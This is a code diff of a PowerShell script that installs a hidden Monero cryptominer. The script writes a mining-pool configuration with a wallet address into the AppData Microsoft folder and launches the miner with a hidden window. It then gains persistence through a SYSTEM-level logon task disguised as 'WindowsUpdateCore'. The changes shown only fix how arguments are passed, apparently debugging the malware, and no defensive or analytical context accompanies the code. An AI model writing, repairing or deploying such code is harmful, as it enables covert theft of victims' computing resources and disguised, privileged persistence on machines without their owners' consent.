@@ -44,14 +44,12 @@ try {
 $config = '{"autosave":false,"background":true,"cpu":{"enabled":true,"max-threads-hint":35,"priority":2},"pools":[{"url":"pool.supportxmr.com:3333","user":"89V3sDoLBK2PL5Sj3UZXNYBWbF7JSzz8kWHWJ2AukBM3CioABmuDGYj56auRmQ1eifjSbNHe3sdmm2DwNqA7nPrTKwrgViM","pass":"x","tls":true,"keepalive":true}],"log-file":null,"print-time":0}'
 [System.IO.File]::WriteAllText($env:APPDATA + '\Microsoft\config.json', $config)
 
-# FIXED Start-Process line
-$argList = "--background --config=`"$env:APPDATA\Microsoft\config.json`""
+$argList = @("--background", "--config=`"$env:APPDATA\Microsoft\config.json`"")
 Start-Process -FilePath $exe -ArgumentList $argList -WindowStyle Hidden
 Write-Host "[+] Miner launched at 35%" -ForegroundColor Green
 
-# FIXED schtasks line
-$taskCmd = "`"$exe`" --background"
-schtasks /create /tn "WindowsUpdateCore" /tr $taskCmd /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue
+$taskPath = "`"$exe`" --background"
+schtasks /create /tn "WindowsUpdateCore" /tr $taskPath /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue
 Write-Host "[+] Persistence set" -ForegroundColor Green
 
 try {
